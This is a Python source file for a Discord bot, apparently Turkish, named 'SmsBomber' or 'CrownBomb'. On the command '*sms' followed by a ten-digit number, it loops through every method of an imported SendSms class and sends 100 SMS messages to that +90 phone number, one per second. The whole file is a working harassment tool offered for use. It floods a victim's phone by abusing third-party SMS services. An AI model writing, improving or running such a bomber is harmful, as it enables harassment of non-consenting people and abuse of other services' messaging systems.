import discord
from time import sleep
from sms import SendSms
from colorama import Fore, Style
import os

TOKEN = ""
gif = "https://www.canva.com/design/DAFhNxZKsHY/MToTUTLw6DdKeHFhD6FmIQ/watch?utm_content=DAFhNxZKsHY&utm_campaign=celebratory_first_publish&utm_medium=link&utm_source=celebratory_first_publish"
adet = 100
saniye = 1

intents = discord.Intents.all()
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    os.system('cls')
    print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}SmsBomber BOT Aktif!")
    activity = discord.Activity(type=discord.ActivityType.playing, name="Larins#1337")
    await client.change_presence(activity=activity)
    
@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if len(message.content.split(" ")) == 2 and message.content.split(" ")[0] == "*sms":
        if len(message.content.split(" ")[1]) == 10:
            telno = message.content.split(" ")[1]
            embed=discord.Embed(title="SMS Bomber (+90)", description=(f"{adet} adet SMS Gönderiliyor --> **{telno}\n{message.author.mention}**"), color=0x00FF00)
            embed.set_thumbnail(url=gif)
            embed.set_footer(text="CrownBomb by Larins#1337")
            await message.channel.send(embed=embed)
            sms = SendSms(telno, "")
            while sms.adet < adet:
                for attribute in dir(SendSms):
                    attribute_value = getattr(SendSms, attribute)
                    if callable(attribute_value):
                        if attribute.startswith('__') == False:
                            if sms.adet == adet:
                                break
                            exec("sms."+attribute+"()")
                            sleep(saniye)
            await message.channel.send(telno+" --> "+str(sms.adet)+f" adet SMS gönderildi.\n{message.author.mention}")                        
        else:
            await message.channel.send(f"Geçerli komut yazınız!\nYardım için ' *help ' yazınız.\n{message.author.mention}")
    elif "*help" == message.content:
        await message.channel.send(f"Sms göndermek için komutu aşağıdaki gibi yazınız.\n```*sms 5051234567```\n*sms\n{message.author.mention}")
    else:
        pass
  
client.run(TOKEN)